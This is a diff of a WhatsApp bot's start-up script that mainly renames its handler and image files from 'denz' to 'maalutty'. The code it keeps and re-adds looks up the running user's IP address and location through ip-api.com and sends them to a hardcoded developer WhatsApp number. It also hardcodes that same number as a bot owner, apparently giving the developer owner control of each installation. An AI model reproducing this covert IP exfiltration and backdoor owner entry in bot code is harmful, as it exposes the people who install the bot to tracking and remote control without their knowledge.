@@ -17,7 +17,7 @@ const settings = JSON.parse(fs.readFileSync('./settings.json'))
 const sleep = async (ms) => {
 return new Promise(resolve => setTimeout(resolve, ms))
 }
-nocache('./denz.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))
+nocache('./maalutty.js', module => console.log(color('|TRM|'), color(`${module} Updated!`, 'cyan')))
 
 async function starts() {
 denz.autoReconnect = ReconnectMode.onConnectionLost
@@ -39,11 +39,11 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
  teks = `Hi`
  denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('ǫʀ ɪs ʀᴜɴɪɴɢ', 'blue'))
- denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 ${settings.NamaBot}, 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 H U S N I ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/917025868709?text=Hi bro"}}})
+ denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*𝙷𝚒 𝚋𝚛𝚘 ${settings.NamaBot}, 𝙱𝙾𝚃 𝙸𝚂 𝙲𝙾𝙽𝙽𝙴𝙲𝚃 𝚈𝙾𝚄𝚁 𝙽𝚄𝙼𝙱𝙴𝚁*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*𝙸𝚏 𝚝𝚑𝚎𝚛𝚎 𝚊𝚗𝚢 𝚎𝚛𝚛𝚘𝚛/𝚙𝚕𝚎𝚊𝚜𝚎 𝚌𝚘𝚗𝚝𝚊𝚌𝚝 𝙱𝚘𝚝 𝚘𝚠𝚗𝚎𝚛, 𝚃𝚑𝚊𝚗𝚔 𝚢𝚘𝚞 𝚏𝚘𝚛 𝚌𝚑𝚘𝚘𝚜𝚒𝚗𝚐 𝚖𝚢 𝚋𝚘𝚝*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "𝙲𝚛𝚎𝚊𝚝𝚘𝚛 H U S N I ",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./maalutty.jpg'),sourceUrl:"https://wa.me/917025868709?text=Hi bro"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("917025868709@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Husni ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/917025868709?text=Hi bro"}}})
+       denz.sendMessage("917025868709@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Husni ser",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./maalutty.jpg'),sourceUrl:"https://wa.me/917025868709?text=Hi bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
@@ -68,7 +68,7 @@ exec(`cd /sdcard/download && play *mp3`)
 }
    
    denz.on('chat-update', async (mek) => {
-        require('./denz.js')(denz, mek)
+        require('./maalutty.js')(denz, mek)
         ownerNumber = ["917025868709@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
         dtod = "@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
@@ -122,7 +122,7 @@ buttons: gbutsan,
 headerType: 4
 }
 denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
-        thumbnail: fs.readFileSync('./denz.jpg'),
+        thumbnail: fs.readFileSync('./maalutty.jpg'),
         "contextInfo": {
             mentionedJid: [num]},
         caption: 'Tes',
@@ -152,7 +152,7 @@ buttons: gbutsan,
 headerType: 4
 }
 denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {
-        thumbnail: fs.readFileSync('./denz.jpg'),
+        thumbnail: fs.readFileSync('./maalutty.jpg'),
         "contextInfo": {
             mentionedJid: [num]},
         caption: 'Tes',
